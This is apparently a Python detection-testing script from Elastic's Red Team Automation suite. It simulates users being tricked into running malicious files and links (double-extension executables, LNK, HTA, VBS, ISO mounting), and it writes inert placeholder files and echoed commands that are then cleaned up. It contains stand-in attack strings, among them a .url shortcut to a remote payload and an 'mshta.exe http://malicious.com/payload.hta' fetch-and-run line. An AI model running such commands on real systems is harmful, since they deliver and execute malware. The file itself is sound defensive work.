# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

# Name: User Execution Simulation
# RTA: user_execution_simulation.py
# ATT&CK: T0863, T1204, T1204.001, T1204.002
# Description: Simulates user execution techniques where a user is tricked into
#              running malicious content. Includes malicious file and link scenarios.

import logging
from pathlib import Path

from . import OSType, RuleMetadata, _common, register_code_rta

log = logging.getLogger(__name__)


@register_code_rta(
    id="e1f2a3b4-c5d6-7890-ef12-3456789abcde",
    name="user_execution_malicious_file",
    platforms=[OSType.WINDOWS],
    endpoint_rules=[
        RuleMetadata(
            id="f1f2a3b4-c5d6-7890-ef12-3456789abcdf",
            name="Suspicious File Execution from User Downloads",
        ),
        RuleMetadata(
            id="01f2a3b4-c5d6-7890-ef12-3456789abce0",
            name="Executable File Creation in User Directory",
        ),
    ],
    siem_rules=[
        RuleMetadata(
            id="11f2a3b4-c5d6-7890-ef12-3456789abce1",
            name="Potential User Execution of Malicious File",
        ),
    ],
    techniques=["T1204", "T1204.002"],
)
def main():
    """
    Simulates user execution of malicious files.

    This RTA demonstrates patterns associated with users being tricked into
    executing malicious files downloaded from the internet or received via email.
    All operations are safe simulations.
    """
    log.info("Simulating user execution of malicious file patterns")
    powershell = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"

    # Simulate executable dropped in Downloads folder (common malware delivery)
    log.info("Simulating executable creation in Downloads folder")
    downloads_exe = Path("C:\\Users\\Public\\Downloads\\invoice_2024.exe")
    _common.create_file_with_data(
        str(downloads_exe),
        "REM This is a simulated malicious executable for detection testing\r\n",
    )

    # Simulate double extension trick (e.g., document.pdf.exe)
    log.info("Simulating double extension executable")
    double_ext = Path("C:\\Users\\Public\\Downloads\\report.pdf.exe")
    _common.create_file_with_data(
        str(double_ext),
        "REM Simulated double extension malware\r\n",
    )

    # Simulate script file execution from temp (common post-download behavior)
    log.info("Simulating script execution from temp directory")
    temp_script = Path("C:\\Users\\Public\\AppData\\Local\\Temp\\update.vbs")
    temp_script.parent.mkdir(parents=True, exist_ok=True)
    _common.create_file_with_data(
        str(temp_script),
        "' Simulated VBS script for detection testing\r\nWScript.Echo \"Test\"\r\n",
    )

    # Simulate execution of file from browser download cache
    log.info("Simulating browser download execution pattern")
    _ = _common.execute_command(
        [powershell, "-Command", "echo", "'Start-Process C:\\Users\\*\\Downloads\\*.exe'"],
        timeout_secs=10,
    )

    # Simulate LNK file execution (malicious shortcut)
    log.info("Simulating LNK shortcut execution")
    lnk_file = Path("C:\\Users\\Public\\Desktop\\Important_Document.lnk")
    _common.create_file_with_data(
        str(lnk_file),
        "Simulated LNK file for detection testing",
    )

    # Simulate ISO/IMG mount execution pattern
    log.info("Simulating ISO mount execution pattern")
    _ = _common.execute_command(
        [powershell, "-Command", "echo", "'Mount-DiskImage -ImagePath C:\\Users\\*\\Downloads\\*.iso'"],
        timeout_secs=10,
    )

    # Simulate HTA file execution
    log.info("Simulating HTA file download and execution pattern")
    hta_file = Path("C:\\Users\\Public\\Downloads\\update.hta")
    _common.create_file_with_data(
        str(hta_file),
        "<html><head><script>// Simulated HTA for testing</script></head></html>",
    )

    # Cleanup
    log.info("Cleaning up simulation files")
    _common.remove_file(str(downloads_exe))
    _common.remove_file(str(double_ext))
    _common.remove_file(str(temp_script))
    _common.remove_file(str(lnk_file))
    _common.remove_file(str(hta_file))

    log.info("User execution malicious file simulation completed")


@register_code_rta(
    id="e2f3a4b5-c6d7-8901-f012-456789abcdef",
    name="user_execution_malicious_link",
    platforms=[OSType.WINDOWS],
    endpoint_rules=[
        RuleMetadata(
            id="f2f3a4b5-c6d7-8901-f012-456789abcdf0",
            name="Suspicious URL File Execution",
        ),
    ],
    siem_rules=[
        RuleMetadata(
            id="02f3a4b5-c6d7-8901-f012-456789abcdf1",
            name="Potential User Execution via Malicious Link",
        ),
    ],
    techniques=["T1204", "T1204.001"],
)
def main_link():
    """
    Simulates user execution via malicious links.

    This RTA demonstrates patterns associated with users clicking malicious links
    that lead to payload download and execution.
    """
    log.info("Simulating user execution via malicious link patterns")
    powershell = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"

    # Simulate URL file creation (malicious internet shortcut)
    log.info("Simulating malicious URL file creation")
    url_file = Path("C:\\Users\\Public\\Downloads\\click_here.url")
    url_content = (
        "[InternetShortcut]\r\n"
        "URL=file://malicious-server/share/payload.exe\r\n"
    )
    _common.create_file_with_data(str(url_file), url_content)

    # Simulate browser spawning suspicious child process
    log.info("Simulating browser spawning command interpreter")
    _ = _common.execute_command(
        [powershell, "-Command", "echo", "'iexplore.exe spawning cmd.exe'"],
        timeout_secs=10,
    )

    # Simulate mshta execution from URL
    log.info("Simulating mshta URL execution pattern")
    _ = _common.execute_command(
        [powershell, "-Command", "echo", "'mshta.exe http://malicious.com/payload.hta'"],
        timeout_secs=10,
    )

    # Cleanup
    log.info("Cleaning up simulation files")
    _common.remove_file(str(url_file))

    log.info("User execution malicious link simulation completed")
